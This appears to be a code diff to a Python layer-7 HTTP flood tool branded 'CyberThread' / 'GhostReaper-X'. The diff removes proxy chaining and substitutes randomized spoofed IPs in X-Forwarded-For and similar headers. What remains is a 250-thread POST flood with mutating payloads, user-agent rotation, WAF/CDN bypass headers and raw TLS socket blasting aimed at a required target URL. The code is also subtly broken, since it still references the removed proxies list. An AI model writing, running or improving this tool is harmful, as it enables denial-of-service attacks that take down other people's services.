@@ -10,7 +10,6 @@ import sys
 import traceback
 import os
 import base64
-import requests
 import argparse
 
 # ANSI color codes for output
@@ -23,8 +22,6 @@ ANSI_RESET = "\033[0m"
 # Global variables
 target = ""
 threads = 0
-proxy_file = ""
-hop_count = 0
 payload_type = ""
 ua_file = ""
 bypass_header = False
@@ -34,7 +31,6 @@ exploit_chain = False
 delay = 0
 flood_method = ""
 failover_monitoring = False
-proxies = []
 user_agents = []
 headers = {}
 tls_context = ssl.create_default_context()
@@ -53,7 +49,7 @@ retry_counter = 0
 
 def parse_args():
     parser = argparse.ArgumentParser(description="CyberThread L7 Exploit Tool")
-    parser.add_argument("--target", type=str, help="Override default target (e.g., http://example.com)")
+    parser.add_argument("--target", type=str, required=True, help="Target URL (e.g., http://example.com)")
     parser.add_argument("--fire", action="store_true", help="Run in brutal mode")
     return parser.parse_args()
 
@@ -63,28 +59,6 @@ def load_list(file):
         return []
     with open(file, 'r') as f:
         return [x.strip() for x in f if x.strip()]
-
-def load_proxies(file):
-    global proxies
-    proxies = load_list(file)
-    validate_proxies()
-    if not proxies:
-        print(f"{ANSI_RED}[FATAL] No proxies loaded. Aborting.{ANSI_RESET}")
-        sys.exit(1)
-
-def validate_proxies():
-    valid_proxies = []
-    for proxy in proxies:
-        try:
-            host, port = proxy.split(":")
-            conn = http.client.HTTPSConnection(host, port=int(port), timeout=5)
-            conn.request("GET", "/")
-            resp = conn.getresponse()
-            if resp.status == 200:
-                valid_proxies.append(proxy)
-        except:
-            pass
-    proxies[:] = valid_proxies  # Update the global proxies list
 
 def load_user_agents(file):
     global user_agents
@@ -100,15 +74,15 @@ def inject_headers():
         "Accept-Language": random.choice(["en-US,en;q=0.9", "id-ID,id;q=0.8", "en-GB,en;q=0.7"])
     }
     if bypass_header:
-        headers["X-Originating-IP"] = random.choice(proxies)
+        headers["X-Originating-IP"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
         headers["X-Forwarded-Host"] = target
         headers["X-Request-ID"] = str(random.randint(100000, 999999))
         headers["X-Amzn-Trace-Id"] = f"Root=1-{random.randint(10000000,99999999)}"
-        headers["X-Forwarded-For"] = random.choice(proxies)
-        headers["X-Real-IP"] = random.choice(proxies)
-        headers["Via"] = random.choice(proxies)
+        headers["X-Forwarded-For"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+        headers["X-Real-IP"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
+        headers["Via"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
         headers["Forwarded"] = f"for={random.choice(proxies)};host={target}"
-        headers["True-Client-IP"] = random.choice(proxies)
+        headers["True-Client-IP"] = f"{random.randint(1, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 255)}"
         headers = {k: v.upper() if random.choice([True, False]) else v for k, v in headers.items()}
         headers.update({f"X-Custom-{i}": f"Value{i}" for i in range(random.randint(1, 5))})
     return headers
@@ -148,20 +122,12 @@ def mutate_payload(payload_type):
     else:
         return json.dumps({"error": "unknown payload type"})
 
-def rotate_proxy_chain():
-    if not proxies:
-        return []
-    return random.sample(proxies, k=min(hop_count, len(proxies)))
-
 def cycle_session():
-    if not proxies:
-        return
     try:
         start_time = time.time()
         login_payload = {"username": "user", "password": "pass"}
         login_headers = inject_headers()
-        host, port = random.choice(proxies).split(":")
-        conn = http.client.HTTPSConnection(host, port=int(port), context=tls_context)
+        conn = http.client.HTTPSConnection(parsed_url.hostname, context=tls_context)
         conn.request("POST", "/login", json.dumps(login_payload), login_headers)
         response = conn.getresponse()
         if response.status != 200:
@@ -259,7 +225,7 @@ def monitor_target():
     parsed_url = urlparse(target)
     while not stop_event.is_set():
         try:
-            conn = http.client.HTTPSConnection(parsed_url.netloc, timeout=5)
+            conn = http.client.HTTPSConnection(parsed_url.hostname, timeout=5)
             conn.request("GET", "/")
             resp = conn.getresponse()
             print(f"[MONITOR] {resp.status}")
@@ -270,7 +236,7 @@ def monitor_target():
 def clone_target_headers():
     global parsed_url
     parsed_url = urlparse(target)
-    conn = http.client.HTTPSConnection(parsed_url.netloc)
+    conn = http.client.HTTPSConnection(parsed_url.hostname)
     conn.request("GET", "/")
     res = conn.getresponse()
     return dict(res.getheaders())
@@ -284,12 +250,11 @@ def raw_socket_blast(ip, port=443):
                 ssock.send(payload.encode())
 
 def launch_ghost_sequence():
-    global target, threads, proxy_file, hop_count, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring, silent_mode, log_file
+    global target, threads, payload_type, ua_file, bypass_header, tls_spoofing, session_cycle, exploit_chain, delay, flood_method, failover_monitoring, silent_mode, log_file
 
     print("\nReady to launch GhostReaper-X Sequence")
     print(f"Target     : {target}")
     print(f"Threads    : {threads}")
-    print(f"Proxies    : {proxy_file} ({hop_count} hop)")
     print(f"Payload    : {payload_type}")
     print(f"TLS Finger : { 'Enabled' if tls_spoofing else 'Disabled' }")
     print(f"Header Bypass : { 'Enabled' if bypass_header else 'Disabled' }")
@@ -301,7 +266,6 @@ def launch_ghost_sequence():
     print(f"Silent Mode : { 'Enabled' if silent_mode else 'Disabled' }")
     print(f"Log File   : {log_file_path if log_file_path else 'None'}")
 
-    load_proxies(proxy_file)
     load_user_agents(ua_file)
 
     print(f"[✓] Running recon on {target} ...")
@@ -313,30 +277,24 @@ def launch_ghost_sequence():
         while not stop_event.is_set():
             try:
                 semaphore.acquire()
-                proxy_chain = rotate_proxy_chain()
-                if not proxy_chain:
-                    continue
-                for proxy in proxy_chain:
-                    host, port = proxy.split(":")
-                    parsed_url = urlparse(target)
-                    conn = http.client.HTTPSConnection(host, port=int(port), context=tls_ctx)
-                    local_headers['User-Agent'] = generate_user_agent()
-                    target_path = parsed_url.path + f"?inject={random.randint(1, 1000)}"
-                    local_headers[f"X-Chain-{random.randint(1, 5)}"] = "Exploit" + str(random.randint(1000, 9999))
-                    payload_data = mutate_payload(payload_type)
-                    conn.request(flood_method.upper(), target_path, payload_data, local_headers)
-                    start_time = time.time()
-                    response = conn.getresponse()
-                    rtt = time.time() - start_time
-                    handle_response(response, target, proxy_chain.index(proxy) + 1, rtt)
-                    if session_cycle:
-                        cycle_session()
-                    if failover_monitoring and response.status in [403, 429, 503]:
-                        retry_counter += 1
-                        if retry_counter >= max_retries:
-                            stop_event.set()
-                            break
-                        time.sleep(delay + random.uniform(0.2, 1.0))
+                conn = http.client.HTTPSConnection(parsed_url.hostname, context=tls_ctx)
+                local_headers['User-Agent'] = generate_user_agent()
+                target_path = parsed_url.path + f"?inject={random.randint(1, 1000)}"
+                local_headers[f"X-Chain-{random.randint(1, 5)}"] = "Exploit" + str(random.randint(1000, 9999))
+                payload_data = mutate_payload(payload_type)
+                conn.request(flood_method.upper(), target_path, payload_data, local_headers)
+                start_time = time.time()
+                response = conn.getresponse()
+                rtt = time.time() - start_time
+                handle_response(response, target, 1, rtt)
+                if session_cycle:
+                    cycle_session()
+                if failover_monitoring and response.status in [403, 429, 503]:
+                    retry_counter += 1
+                    if retry_counter >= max_retries:
+                        stop_event.set()
+                        break
+                    time.sleep(delay + random.uniform(0.2, 1.0))
             except Exception as e:
                 if log_file:
                     with open(log_file, 'a') as f:
@@ -377,10 +335,11 @@ def print_status():
 
 def print_banner_brutal():
     print("""
-══════════════════════════════════════╗
+╔══════════════════════════════════════╗
 ║   ☠ CYBERTHREAD ☠                   ║
 ║   Layer-7 Adaptive Exploit Engine   ║
 ║   Status : LIVE | Threads : █████   ║
+║   Target : WAF-Hardened / CDN-Edge 
 ║   Target : WAF-Hardened / CDN-Edge  ║
 ╚══════════════════════════════════════╝
      ↳ Payload Mutation : ENABLED
@@ -411,8 +370,6 @@ if __name__ == "__main__":
         payload_type = "ghost-mutation"
         threads = 250
         flood_method = "POST"
-        hop_count = 3
-        proxy_file = "/tmp/auto_proxy.txt"
         ua_file = "/tmp/ua_fallback.txt"
 
         launch_ghost_sequence()
